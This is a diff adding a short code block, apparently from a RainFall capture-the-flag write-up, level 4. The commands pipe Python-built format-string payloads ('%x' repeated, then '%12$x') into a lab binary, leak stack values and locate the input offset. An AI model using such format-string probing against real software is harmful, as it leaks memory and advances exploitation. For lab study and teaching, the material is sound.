@@ -1,0 +1,8 @@
+```
+level4@RainFall:~$ python -c "print('AAAA' + '_%x' * 20)" > /tmp/exploit4 
+level4@RainFall:~$ cat /tmp/exploit4 | ./level4 
+AAAA_b7ff26b0_bffff794_b7fd0ff4_0_0_bffff758_804848d_bffff550_200_b7fd1ac0_b7ff37d0_41414141_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825
+level4@RainFall:~$ python -c "print('AAAA' + '_%12\$x')" > /tmp/exploit4 
+level4@RainFall:~$ cat /tmp/exploit4 | ./level4 
+AAAA_41414141
+```
